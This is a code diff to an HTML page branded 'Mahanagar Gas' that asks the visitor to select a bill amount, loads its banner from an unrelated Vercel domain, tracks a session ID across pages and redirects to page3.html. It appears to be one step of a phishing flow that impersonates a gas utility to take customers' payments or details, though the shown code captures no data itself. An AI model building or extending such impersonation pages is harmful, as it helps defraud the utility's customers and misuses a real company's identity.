@@ -2,8 +2,7 @@
 <html>
 <head>
   <title>mgl gas</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Enables mobile view -->
-  <style>
+  <meta name="viewport" content="width=device-width, initial-scale=1"> <style>
     body {
       font-family: Arial;
       background-color: #FFFFFF;
@@ -61,7 +60,7 @@
   </style>
 </head>
 <body>
-  <img src=https://welcomupdates.vercel.app/top.jpg" alt="Meri Tasveer">
+  <img src="https://welcomupdates.vercel.app/top.jpg" alt="Meri Tasveer">
 
   <div class="form-container">
     <h2>Mahanagar Gas</h2>
@@ -80,11 +79,20 @@
   </div>
 
   <script>
+    // --- SESSION ID READ ---
+    // Index page se bani hui ID ko yahan read kar rahe hain
+    const sessionId = localStorage.getItem("user_session_id");
+
     function validateCheckbox() {
       var checkbox = document.getElementById('agree');
       if (!checkbox.checked) {
         alert("Please select Bill amount.");
         return false;
+      }
+
+      // Session ID check (Optional safety check)
+      if (!sessionId) {
+        console.log("No Session ID found, but proceeding...");
       }
 
       window.location.href = "page3.html"; // Change this to your next page
